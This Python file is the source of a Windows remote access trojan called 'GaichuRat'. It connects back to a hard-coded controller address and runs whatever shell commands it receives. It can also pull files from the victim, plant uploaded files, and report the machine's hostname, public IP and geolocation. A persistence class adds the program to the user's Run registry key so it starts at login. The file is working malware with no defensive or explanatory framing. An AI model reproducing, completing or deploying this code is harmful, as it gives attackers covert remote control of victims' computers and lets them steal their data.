
import socket
import subprocess
import json
import os
import base64
import urllib.request
import winreg
class Persistence:
    def __init__(self):
        if(self.check_key()):
            # debugging
            print("Already there !...")
        else:
            print("Added !")

    def add_key(self):
        path = os.getcwd() + "\\GaichuRat.exe"
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,r'Software\Microsoft\Windows\CurrentVersion\Run',0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key,'Rat', 0, winreg.REG_SZ, path )
            winreg.CloseKey(key)
        except:
            pass
    def check_key(self):
        try:
            reg = winreg.HKEY_CURRENT_USER
            key = winreg.OpenKey(reg, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_READ)
            i = 0
            exists = False
            # loop through the values inside the reg and return error if there is no key present + add it
            while True:
                value = winreg.EnumValue(key, i)
                if("Rat" not in value):
                    i = i + 1
                    continue
                exists = True
                return exists
        except:
            winreg.CloseKey(key)
            self.add_key()

        
class Commands:


    @property
    def hostname(self):
        try:
            hostname = socket.getfqdn(socket.gethostname()).strip()
            return hostname
        except:
            return "null"
    @property
    def get_ip(self):
        try:
            ip = urllib.request.urlopen("https://api.ipify.org").read().decode("utf-8")
            return ip
        except:
            return "null"
    @property
    def get_loc(self):
        try:
            loc = urllib.request.urlopen("https://freegeoip.app/json/").read().decode("utf-8")
            json_loc = json.loads(loc)
            country_name = json_loc['country_name']
            city = json_loc['city']
            time_zone = json_loc['time_zone']
            lat = json_loc['latitude']
            lod = json_loc['longitude']
            return 'COUNTRY: %s\nCITY: %s\nTIME ZONE: %s\nLAT: %s\nLONG: %s' % (country_name, city, time_zone, lat, lod) #"Country : " + country_name + "\n" + "City : " + city + "\n" + "Time zone : " + time_zone + "\n" + "Lat : " + lat + "\n" + "Long : " + lod
        except :
            return "null"

class Rat:
    def __init__(self, ip, port):   
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.connect(("192.168.0.15", 7001))

    def jsend(self, data):
        jsond = json.dumps(data)
        self.conn.send(jsond.encode("UTF-8")) 

    def jrecv(self):
        jsond = "".encode()
        while True:
            try:
                jsond = jsond + self.conn.recv(1024)
                return json.loads(jsond)
            except ValueError:
                continue

    def execComm(self, comm):
        return subprocess.check_output(comm, shell=True, stderr=0)

    def chgDir(self, path):
        os.chdir(path)
        return ("[+] Successfully changed directory to "+ path).encode("UTF-8")

    def read_file(self, path):
        with open(path, "rb") as f:
            return base64.b64encode(f.read())
    
    def write_file(self, path, content):
        with open(path, "wb") as f:
            f.write(base64.b64decode(content))
            return "[+] Upload successful :)"

    def run(self):
        while(True):
            command = self.jrecv()
            try:
                c = Commands()
                if(command[0] == "exit"): 
                    self.conn.close()
                    exit()
                elif (command[0] =="cd" and len(command) > 1):
                    result = self.chgDir(command[1])
                elif (command[0] == "download"):
                    result = self.read_file(command[1])
                elif (command[0] =="upload"):
                    result = (self.write_file(command[1], command[2])).encode("utf-8")
                elif (command[0] == "get_name"):
                    result = c.hostname.encode("utf-8") 
                elif (command[0] == "get_ip"):
                    result = c.get_ip.encode("utf-8") 
                elif (command[0] == "get_loc"):
                    result = c.get_loc.encode("utf-8")     
                else:
                    result = self.execComm(command)
            except Exception:
                result = ("[-] Error executing ").encode("utf-8")


            self.jsend(result.decode("UTF-8"))


# pers = Persistence()
rat = Rat("192.168.0.15", 7001)
rat.run()

